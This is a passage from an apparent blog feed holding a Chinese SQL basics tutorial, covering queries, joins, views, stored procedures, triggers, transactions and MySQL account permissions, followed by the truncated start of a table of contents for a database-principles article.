href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E4%B8%83%E8%A7%86%E5%9B%BE">十七、视图</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E5%85%AB%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B">十八、存储过程</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8D%81%E4%B9%9D%E6%B8%B8%E6%A0%87">十九、游标</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%BA%8C%E5%8D%81%E8%A7%A6%E5%8F%91%E5%99%A8">二十、触发器</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%BA%8C%E5%8D%81%E4%B8%80%E4%BA%8B%E5%8A%A1%E7%AE%A1%E7%90%86">二十一、事务管理</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%AD%97%E7%AC%A6%E9%9B%86">二十二、字符集</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E4%BA%8C%E5%8D%81%E4%B8%89%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86">二十三、权限管理</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、基础"><a href="#一、基础" class="headerlink" title="一、基础"></a>一、基础</h1><p>模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。</p><p>主键的值不允许修改，也不允许复用（不能使用已经删除的主键值赋给新数据行的主键）。</p><p>SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。</p><p>SQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。</p><p>SQL 支持以下三种注释：</p><pre><code># 注释SELECT *FROM mytable; -- 注释/* 注释1   注释2 */</code></pre><p>数据库创建与使用：</p><pre><code>CREATE DATABASE test;USE test;</code></pre><h1 id="二、创建表"><a href="#二、创建表" class="headerlink" title="二、创建表"></a>二、创建表</h1><pre><code>CREATE TABLE mytable (  id INT NOT NULL AUTO_INCREMENT,  col1 INT NOT NULL DEFAULT 1,  col2 VARCHAR(45) NULL,  col3 DATE NULL,  PRIMARY KEY (`id`));</code></pre><h1 id="三、修改表"><a href="#三、修改表" class="headerlink" title="三、修改表"></a>三、修改表</h1><p>添加列</p><pre><code>ALTER TABLE mytableADD col CHAR(20);</code></pre><p>删除列</p><pre><code>ALTER TABLE mytableDROP COLUMN col;</code></pre><p>删除表</p><pre><code>DROP TABLE mytable;</code></pre><h1 id="四、插入"><a href="#四、插入" class="headerlink" title="四、插入"></a>四、插入</h1><p>普通插入</p><pre><code>INSERT INTO mytable(col1, col2)VALUES(val1, val2);</code></pre><p>插入检索出来的数据</p><pre><code>INSERT INTO mytable1(col1, col2)SELECT col1, col2FROM mytable2;</code></pre><p>将一个表的内容插入到一个新表</p><pre><code>CREATE TABLE newtable ASSELECT * FROM mytable;</code></pre><h1 id="五、更新"><a href="#五、更新" class="headerlink" title="五、更新"></a>五、更新</h1><pre><code>UPDATE mytableSET col = valWHERE id = 1;</code></pre><h1 id="六、删除"><a href="#六、删除" class="headerlink" title="六、删除"></a>六、删除</h1><pre><code>DELETE FROM mytableWHERE id = 1;</code></pre><p><strong>TRUNCATE TABLE</strong> 可以清空表，也就是删除所有行。</p><pre><code>TRUNCATE TABLE mytable;</code></pre><p>使用更新和删除操作时一定要用 WHERE 子句，不然会把整张表的数据都破坏。可以先用 SELECT 语句进行测试，防止错误删除。</p><h1 id="七、查询"><a href="#七、查询" class="headerlink" title="七、查询"></a>七、查询</h1><h2 id="DISTINCT"><a href="#DISTINCT" class="headerlink" title="DISTINCT"></a>DISTINCT</h2><p>相同值只会出现一次。它作用于所有列，也就是说所有列的值都相同才算相同。</p><pre><code>SELECT DISTINCT col1, col2FROM mytable;</code></pre><h2 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h2><p>限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。</p><p>返回前 5 行：</p><pre><code>SELECT *FROM mytableLIMIT 5;SELECT *FROM mytableLIMIT 0, 5;</code></pre><p>返回第 3 ~ 5 行：</p><pre><code>SELECT *FROM mytableLIMIT 2, 3;</code></pre><h1 id="八、排序"><a href="#八、排序" class="headerlink" title="八、排序"></a>八、排序</h1><ul><li><strong>ASC</strong> ：升序（默认）</li><li><strong>DESC</strong> ：降序</li></ul><p>可以按多个列进行排序，并且为每个列指定不同的排序方式：</p><pre><code>SELECT *FROM mytableORDER BY col1 DESC, col2 ASC;</code></pre><h1 id="九、过滤"><a href="#九、过滤" class="headerlink" title="九、过滤"></a>九、过滤</h1><p>不进行过滤的数据非常大，导致通过网络传输了多余的数据，从而浪费了网络带宽。因此尽量使用 SQL 语句来过滤不必要的数据，而不是传输所有的数据到客户端中然后由客户端进行过滤。</p><pre><code>SELECT *FROM mytableWHERE col IS NULL;</code></pre><p>下表显示了 WHERE 子句可用的操作符</p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>=</td><td>等于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;&gt; !=</td><td>不等于</td></tr><tr><td>&lt;= !&gt;</td><td>小于等于</td></tr><tr><td>&gt;= !&lt;</td><td>大于等于</td></tr><tr><td>BETWEEN</td><td>在两个值之间</td></tr><tr><td>IS NULL</td><td>为 NULL 值</td></tr></tbody></table><p>应该注意到，NULL 与 0、空字符串都不同。</p><p><strong>AND 和 OR</strong> 用于连接多个过滤条件。优先处理 AND，当一个过滤表达式涉及到多个 AND 和 OR 时，可以使用 () 来决定优先级，使得优先级关系更清晰。</p><p><strong>IN</strong> 操作符用于匹配一组值，其后也可以接一个 SELECT 子句，从而匹配子查询得到的一组值。</p><p><strong>NOT</strong> 操作符用于否定一个条件。</p><h1 id="十、通配符"><a href="#十、通配符" class="headerlink" title="十、通配符"></a>十、通配符</h1><p>通配符也是用在过滤语句中，但它只能用于文本字段。</p><ul><li><strong>%</strong> 匹配 &gt;=0 个任意字符；</li><li><strong>_</strong> 匹配 ==1 个任意字符；</li><li><strong>[ ]</strong> 可以匹配集合内的字符，例如 [ab] 将匹配字符 a 或者 b。用脱字符 ^ 可以对其进行否定，也就是不匹配集合内的字符。</li></ul><p>使用 Like 来进行通配符匹配。</p><pre><code>SELECT *FROM mytableWHERE col LIKE &#39;[^AB]%&#39;; -- 不以 A 和 B 开头的任意文本</code></pre><p>不要滥用通配符，通配符位于开头处匹配会非常慢。</p><h1 id="十一、计算字段"><a href="#十一、计算字段" class="headerlink" title="十一、计算字段"></a>十一、计算字段</h1><p>在数据库服务器上完成数据的转换和格式化的工作往往比客户端上快得多，并且转换和格式化后的数据量更少的话可以减少网络通信量。</p><p>计算字段通常需要使用 <strong>AS</strong> 来取别名，否则输出的时候字段名为计算表达式。</p><pre><code>SELECT col1 * col2 AS aliasFROM mytable;</code></pre><p><strong>CONCAT()</strong> 用于连接两个字段。许多数据库会使用空格把一个值填充为列宽，因此连接的结果会出现一些不必要的空格，使用 <strong>TRIM()</strong> 可以去除首尾空格。</p><pre><code>SELECT CONCAT(TRIM(col1), &#39;(&#39;, TRIM(col2), &#39;)&#39;) AS concat_colFROM mytable;</code></pre><h1 id="十二、函数"><a href="#十二、函数" class="headerlink" title="十二、函数"></a>十二、函数</h1><p>各个 DBMS 的函数都是不相同的，因此不可移植，以下主要是 MySQL 的函数。</p><h2 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h2><table><thead><tr><th>函 数</th><th>说 明</th></tr></thead><tbody><tr><td>AVG()</td><td>返回某列的平均值</td></tr><tr><td>COUNT()</td><td>返回某列的行数</td></tr><tr><td>MAX()</td><td>返回某列的最大值</td></tr><tr><td>MIN()</td><td>返回某列的最小值</td></tr><tr><td>SUM()</td><td>返回某列值之和</td></tr></tbody></table><p>AVG() 会忽略 NULL 行。</p><p>使用 DISTINCT 可以让汇总函数值汇总不同的值。</p><pre><code>SELECT AVG(DISTINCT col1) AS avg_colFROM mytable;</code></pre><h2 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>LEFT()</td><td>左边的字符</td></tr><tr><td>RIGHT()</td><td>右边的字符</td></tr><tr><td>LOWER()</td><td>转换为小写字符</td></tr><tr><td>UPPER()</td><td>转换为大写字符</td></tr><tr><td>LTRIM()</td><td>去除左边的空格</td></tr><tr><td>RTRIM()</td><td>去除右边的空格</td></tr><tr><td>LENGTH()</td><td>长度</td></tr><tr><td>SOUNDEX()</td><td>转换为语音值</td></tr></tbody></table><p>其中， <strong>SOUNDEX()</strong> 可以将一个字符串转换为描述其语音表示的字母数字模式。</p><pre><code>SELECT *FROM mytableWHERE SOUNDEX(col1) = SOUNDEX(&#39;apple&#39;)</code></pre><h2 id="日期和时间处理"><a href="#日期和时间处理" class="headerlink" title="日期和时间处理"></a>日期和时间处理</h2><ul><li>日期格式：YYYY-MM-DD</li><li>时间格式：HH:MM:SS</li></ul><table><thead><tr><th>函 数</th><th>说 明</th></tr></thead><tbody><tr><td>AddDate()</td><td>增加一个日期（天、周等）</td></tr><tr><td>AddTime()</td><td>增加一个时间（时、分等）</td></tr><tr><td>CurDate()</td><td>返回当前日期</td></tr><tr><td>CurTime()</td><td>返回当前时间</td></tr><tr><td>Date()</td><td>返回日期时间的日期部分</td></tr><tr><td>DateDiff()</td><td>计算两个日期之差</td></tr><tr><td>Date_Add()</td><td>高度灵活的日期运算函数</td></tr><tr><td>Date_Format()</td><td>返回一个格式化的日期或时间串</td></tr><tr><td>Day()</td><td>返回一个日期的天数部分</td></tr><tr><td>DayOfWeek()</td><td>对于一个日期，返回对应的星期几</td></tr><tr><td>Hour()</td><td>返回一个时间的小时部分</td></tr><tr><td>Minute()</td><td>返回一个时间的分钟部分</td></tr><tr><td>Month()</td><td>返回一个日期的月份部分</td></tr><tr><td>Now()</td><td>返回当前日期和时间</td></tr><tr><td>Second()</td><td>返回一个时间的秒部分</td></tr><tr><td>Time()</td><td>返回一个日期时间的时间部分</td></tr><tr><td>Year()</td><td>返回一个日期的年份部分</td></tr></tbody></table><pre><code>mysql&gt; SELECT NOW();2018-4-14 20:25:11</code></pre><h2 id="数值处理"><a href="#数值处理" class="headerlink" title="数值处理"></a>数值处理</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SIN()</td><td>正弦</td></tr><tr><td>COS()</td><td>余弦</td></tr><tr><td>TAN()</td><td>正切</td></tr><tr><td>ABS()</td><td>绝对值</td></tr><tr><td>SQRT()</td><td>平方根</td></tr><tr><td>MOD()</td><td>余数</td></tr><tr><td>EXP()</td><td>指数</td></tr><tr><td>PI()</td><td>圆周率</td></tr><tr><td>RAND()</td><td>随机数</td></tr></tbody></table><h1 id="十三、分组"><a href="#十三、分组" class="headerlink" title="十三、分组"></a>十三、分组</h1><p>分组就是把具有相同的数据值的行放在同一组中。</p><p>可以对同一分组数据使用汇总函数进行处理，例如求分组数据的平均值等。</p><p>指定的分组字段除了能按该字段进行分组，也会自动按该字段进行排序。</p><pre><code>SELECT col, COUNT(*) AS numFROM mytableGROUP BY col;</code></pre><p>GROUP BY 自动按分组字段进行排序，ORDER BY 也可以按汇总字段来进行排序。</p><pre><code>SELECT col, COUNT(*) AS numFROM mytableGROUP BY colORDER BY num;</code></pre><p>WHERE 过滤行，HAVING 过滤分组，行过滤应当先于分组过滤。</p><pre><code>SELECT col, COUNT(*) AS numFROM mytableWHERE col &gt; 2GROUP BY colHAVING num &gt;= 2;</code></pre><p>分组规定：</p><ul><li>GROUP BY 子句出现在 WHERE 子句之后，ORDER BY 子句之前；</li><li>除了汇总字段外，SELECT 语句中的每一字段都必须在 GROUP BY 子句中给出；</li><li>NULL 的行会单独分为一组；</li><li>大多数 SQL 实现不支持 GROUP BY 列具有可变长度的数据类型。</li></ul><h1 id="十四、子查询"><a href="#十四、子查询" class="headerlink" title="十四、子查询"></a>十四、子查询</h1><p>子查询中只能返回一个字段的数据。</p><p>可以将子查询的结果作为 WHRER 语句的过滤条件：</p><pre><code>SELECT *FROM mytable1WHERE col1 IN (SELECT col2               FROM mytable2);</code></pre><p>下面的语句可以检索出客户的订单数量，子查询语句会对第一个查询检索出的每个客户执行一次：</p><pre><code>SELECT cust_name, (SELECT COUNT(*)                   FROM Orders                   WHERE Orders.cust_id = Customers.cust_id)                   AS orders_numFROM CustomersORDER BY cust_name;</code></pre><h1 id="十五、连接"><a href="#十五、连接" class="headerlink" title="十五、连接"></a>十五、连接</h1><p>连接用于连接多个表，使用 JOIN 关键字，并且条件语句使用 ON 而不是 WHERE。</p><p>连接可以替换子查询，并且比子查询的效率一般会更快。</p><p>可以用 AS 给列名、计算字段和表名取别名，给表名取别名是为了简化 SQL 语句以及连接相同表。</p><h2 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h2><p>内连接又称等值连接，使用 INNER JOIN 关键字。</p><pre><code>SELECT A.value, B.valueFROM tablea AS A INNER JOIN tableb AS BON A.key = B.key;</code></pre><p>可以不明确使用 INNER JOIN，而使用普通查询并在 WHERE 中将两个表中要连接的列用等值方法连接起来。</p><pre><code>SELECT A.value, B.valueFROM tablea AS A, tableb AS BWHERE A.key = B.key;</code></pre><p>在没有条件语句的情况下返回笛卡尔积。</p><h2 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h2><p>自连接可以看成内连接的一种，只是连接的表是自身而已。</p><p>一张员工表，包含员工姓名和员工所属部门，要找出与 Jim 处在同一部门的所有员工姓名。</p><p>子查询版本</p><pre><code>SELECT nameFROM employeeWHERE department = (      SELECT department      FROM employee      WHERE name = &quot;Jim&quot;);</code></pre><p>自连接版本</p><pre><code>SELECT e1.nameFROM employee AS e1 INNER JOIN employee AS e2ON e1.department = e2.department      AND e2.name = &quot;Jim&quot;;</code></pre><h2 id="自然连接"><a href="#自然连接" class="headerlink" title="自然连接"></a>自然连接</h2><p>自然连接是把同名列通过等值测试连接起来的，同名列可以有多个。</p><p>内连接和自然连接的区别：内连接提供连接的列，而自然连接自动连接所有同名列。</p><pre><code>SELECT A.value, B.valueFROM tablea AS A NATURAL JOIN tableb AS B;</code></pre><h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><p>外连接保留了没有关联的那些行。分为左外连接，右外连接以及全外连接，左外连接就是保留左表没有关联的行。</p><p>检索所有顾客的订单信息，包括还没有订单信息的顾客。</p><pre><code>SELECT Customers.cust_id, Orders.order_numFROM Customers LEFT OUTER JOIN OrdersON Customers.cust_id = Orders.cust_id;</code></pre><p>customers 表：</p><table><thead><tr><th>cust_id</th><th>cust_name</th></tr></thead><tbody><tr><td>1</td><td>a</td></tr><tr><td>2</td><td>b</td></tr><tr><td>3</td><td>c</td></tr></tbody></table><p>orders 表：</p><table><thead><tr><th>order_id</th><th>cust_id</th></tr></thead><tbody><tr><td>1</td><td>1</td></tr><tr><td>2</td><td>1</td></tr><tr><td>3</td><td>3</td></tr><tr><td>4</td><td>3</td></tr></tbody></table><p>结果：</p><table><thead><tr><th>cust_id</th><th>cust_name</th><th>order_id</th></tr></thead><tbody><tr><td>1</td><td>a</td><td>1</td></tr><tr><td>1</td><td>a</td><td>2</td></tr><tr><td>3</td><td>c</td><td>3</td></tr><tr><td>3</td><td>c</td><td>4</td></tr><tr><td>2</td><td>b</td><td>Null</td></tr></tbody></table><h1 id="十六、组合查询"><a href="#十六、组合查询" class="headerlink" title="十六、组合查询"></a>十六、组合查询</h1><p>使用 <strong>UNION</strong> 来组合两个查询，如果第一个查询返回 M 行，第二个查询返回 N 行，那么组合查询的结果一般为 M+N 行。</p><p>每个查询必须包含相同的列、表达式和聚集函数。</p><p>默认会去除相同行，如果需要保留相同行，使用 UNION ALL。</p><p>只能包含一个 ORDER BY 子句，并且必须位于语句的最后。</p><pre><code>SELECT colFROM mytableWHERE col = 1UNIONSELECT colFROM mytableWHERE col =2;</code></pre><h1 id="十七、视图"><a href="#十七、视图" class="headerlink" title="十七、视图"></a>十七、视图</h1><p>视图是虚拟的表，本身不包含数据，也就不能对其进行索引操作。</p><p>对视图的操作和对普通表的操作一样。</p><p>视图具有如下好处：</p><ul><li>简化复杂的 SQL 操作，比如复杂的连接；</li><li>只使用实际表的一部分数据；</li><li>通过只给用户访问视图的权限，保证数据的安全性；</li><li>更改数据格式和表示。</li></ul><pre><code>CREATE VIEW myview ASSELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_colFROM mytableWHERE col5 = val;</code></pre><h1 id="十八、存储过程"><a href="#十八、存储过程" class="headerlink" title="十八、存储过程"></a>十八、存储过程</h1><p>存储过程可以看成是对一系列 SQL 操作的批处理。</p><p>使用存储过程的好处：</p><ul><li>代码封装，保证了一定的安全性；</li><li>代码复用；</li><li>由于是预先编译，因此具有很高的性能。</li></ul><p>命令行中创建存储过程需要自定义分隔符，因为命令行是以 ; 为结束符，而存储过程中也包含了分号，因此会错误把这部分分号当成是结束符，造成语法错误。</p><p>包含 in、out 和 inout 三种参数。</p><p>给变量赋值都需要用 select into 语句。</p><p>每次只能给一个变量赋值，不支持集合的操作。</p><pre><code>delimiter //create procedure myprocedure( out ret int )    begin        declare y int;        select sum(col1)        from mytable        into y;        select y*y into ret;    end //delimiter ;call myprocedure(@ret);select @ret;</code></pre><h1 id="十九、游标"><a href="#十九、游标" class="headerlink" title="十九、游标"></a>十九、游标</h1><p>在存储过程中使用游标可以对一个结果集进行移动遍历。</p><p>游标主要用于交互式应用，其中用户需要对数据集中的任意行进行浏览和修改。</p><p>使用游标的四个步骤：</p><ol><li>声明游标，这个过程没有实际检索出数据；</li><li>打开游标；</li><li>取出数据；</li><li>关闭游标；</li></ol><pre><code>delimiter //create procedure myprocedure(out ret int)    begin        declare done boolean default 0;        declare mycursor cursor for        select col1 from mytable;        # 定义了一个 continue handler，当 sqlstate &#39;02000&#39; 这个条件出现时，会执行 set done = 1        declare continue handler for sqlstate &#39;02000&#39; set done = 1;        open mycursor;        repeat            fetch mycursor into ret;            select ret;        until done end repeat;        close mycursor;    end // delimiter ;</code></pre><h1 id="二十、触发器"><a href="#二十、触发器" class="headerlink" title="二十、触发器"></a>二十、触发器</h1><p>触发器会在某个表执行以下语句时而自动执行：DELETE、INSERT、UPDATE。</p><p>触发器必须指定在语句执行之前还是之后自动执行，之前执行使用 BEFORE 关键字，之后执行使用 AFTER 关键字。BEFORE 用于数据验证和净化，AFTER 用于审计跟踪，将修改记录到另外一张表中。</p><p>INSERT 触发器包含一个名为 NEW 的虚拟表。</p><pre><code>CREATE TRIGGER mytrigger AFTER INSERT ON mytableFOR EACH ROW SELECT NEW.col into @result;SELECT @result; -- 获取结果</code></pre><p>DELETE 触发器包含一个名为 OLD 的虚拟表，并且是只读的。</p><p>UPDATE 触发器包含一个名为 NEW 和一个名为 OLD 的虚拟表，其中 NEW 是可以被修改的，而 OLD 是只读的。</p><p>MySQL 不允许在触发器中使用 CALL 语句，也就是不能调用存储过程。</p><h1 id="二十一、事务管理"><a href="#二十一、事务管理" class="headerlink" title="二十一、事务管理"></a>二十一、事务管理</h1><p>基本术语：</p><ul><li>事务（transaction）指一组 SQL 语句；</li><li>回退（rollback）指撤销指定 SQL 语句的过程；</li><li>提交（commit）指将未存储的 SQL 语句结果写入数据库表；</li><li>保留点（savepoint）指事务处理中设置的临时占位符（placeholder），你可以对它发布回退（与回退整个事务处理不同）。</li></ul><p>不能回退 SELECT 语句，回退 SELECT 语句也没意义；也不能回退 CREATE 和 DROP 语句。</p><p>MySQL 的事务提交默认是隐式提交，每执行一条语句就把这条语句当成一个事务然后进行提交。当出现 START TRANSACTION 语句时，会关闭隐式提交；当 COMMIT 或 ROLLBACK 语句执行后，事务会自动关闭，重新恢复隐式提交。</p><p>通过设置 autocommit 为 0 可以取消自动提交；autocommit 标记是针对每个连接而不是针对服务器的。</p><p>如果没有设置保留点，ROLLBACK 会回退到 START TRANSACTION 语句处；如果设置了保留点，并且在 ROLLBACK 中指定该保留点，则会回退到该保留点。</p><pre><code>START TRANSACTION// ...SAVEPOINT delete1// ...ROLLBACK TO delete1// ...COMMIT</code></pre><h1 id="二十二、字符集"><a href="#二十二、字符集" class="headerlink" title="二十二、字符集"></a>二十二、字符集</h1><p>基本术语：</p><ul><li>字符集为字母和符号的集合；</li><li>编码为某个字符集成员的内部表示；</li><li>校对字符指定如何比较，主要用于排序和分组。</li></ul><p>除了给表指定字符集和校对外，也可以给列指定：</p><pre><code>CREATE TABLE mytable(col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci )DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci;</code></pre><p>可以在排序、分组时指定校对：</p><pre><code>SELECT *FROM mytableORDER BY col COLLATE latin1_general_ci;</code></pre><h1 id="二十三、权限管理"><a href="#二十三、权限管理" class="headerlink" title="二十三、权限管理"></a>二十三、权限管理</h1><p>MySQL 的账户信息保存在 mysql 这个数据库中。</p><pre><code>USE mysql;SELECT user FROM user;</code></pre><p><strong>创建账户</strong></p><p>新创建的账户没有任何权限。</p><pre><code>CREATE USER myuser IDENTIFIED BY &#39;mypassword&#39;;</code></pre><p><strong>修改账户名</strong></p><pre><code>RENAME myuser TO newuser;</code></pre><p><strong>删除账户</strong></p><pre><code>DROP USER myuser;</code></pre><p><strong>查看权限</strong></p><pre><code>SHOW GRANTS FOR myuser;</code></pre><p><strong>授予权限</strong></p><p>账户用 username@host 的形式定义，username@% 使用的是默认主机名。</p><pre><code>GRANT SELECT, INSERT ON mydatabase.* TO myuser;</code></pre><p><strong>删除权限</strong></p><p>GRANT 和 REVOKE 可在几个层次上控制访问权限：</p><ul><li>整个服务器，使用 GRANT ALL 和 REVOKE ALL；</li><li>整个数据库，使用 ON database.*；</li><li>特定的表，使用 ON database.table；</li><li>特定的列；</li><li>特定的存储过程。</li></ul><pre><code>REVOKE SELECT, INSERT ON mydatabase.* FROM myuser;</code></pre><p><strong>更改密码</strong></p><p>必须使用 Password() 函数</p><pre><code>SET PASSWROD FOR myuser = Password(&#39;new_password&#39;);</code></pre><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>BenForta. SQL 必知必会 [M]. 人民邮电出版社, 2013.</li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/SQL.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL基本使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统原理</title>
      <link href="/2018/12/24/shu-ju-ku/shu-ju-ku-xi-tong-yuan-li/"/>
      <url>/2018/12/24/shu-ju-ku/shu-ju-ku-xi-tong-yuan-li/</url>
      
        <content type="html"><![CDATA[<h2 id="数据库系统原理"><a href="#数据库系统原理" class="headerlink" title="数据库系统原理"></a>数据库系统原理</h2><ul><li>一、事务<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E6%A6%82%E5%BF%B5">概念</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#acid">ACID</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#autocommit">AUTOCOMMIT</a></li></ul></li><li>二、并发一致性问题<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E4%B8%A2%E5%A4%B1%E4%BF%AE%E6%94%B9">丢失修改</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E8%AF%BB%E8%84%8F%E6%95%B0%E6%8D%AE">读脏数据</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E4%B8%8D%E5%8F%AF%E9%87%8D%E5%A4%8D%E8%AF%BB">不可重复读</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%B9%BB%E5%BD%B1%E8%AF%BB">幻影读</a></li></ul></li><li>三、封锁<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%B0%81%E9%94%81%E7%B2%92%E5%BA%A6">封锁粒度</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%B0%81%E9%94%81%E7%B1%BB%E5%9E%8B">封锁类型</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%B0%81%E9%94%81%E5%8D%8F%E8%AE%AE">封锁协议</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#mysql-%E9%9A%90%E5%BC%8F%E4%B8%8E%E6%98%BE%E7%A4%BA%E9%94%81%E5%AE%9A">MySQL 隐式与显示锁定</a></li></ul></li><li>四、隔离级别<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E6%9C%AA%E6%8F%90%E4%BA%A4%E8%AF%BBread-uncommitted">未提交读（READ UNCOMMITTED）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E6%8F%90%E4%BA%A4%E8%AF%BBread-committed">提交读（READ COMMITTED）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%8F%AF%E9%87%8D%E5%A4%8D%E8%AF%BBrepeatable-read">可重复读（REPEATABLE READ）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%8F%AF%E4%B8%B2%E8%A1%8C%E5%8C%96serializable">可串行化（SERIALIZABLE）</a></li></ul></li><li>五、多版本并发控制<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E7%89%88%E6%9C%AC%E5%8F%B7">版本号</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E9%9A%90%E8%97%8F%E7%9A%84%E5%88%97">隐藏的列</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#undo-%E6%97%A5%E5%BF%97">Undo 日志</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B">实现过程</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#%E5%BF%AB%E7%85%A7%E8%AF%BB%E4%B8%8E%E5%BD%93%E5%89%8D%E8%AF%BB">快照读与当前读</a></li></ul></li><li>六、Next-Key Locks<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md#record-locks">Record Locks</a></li><li><a 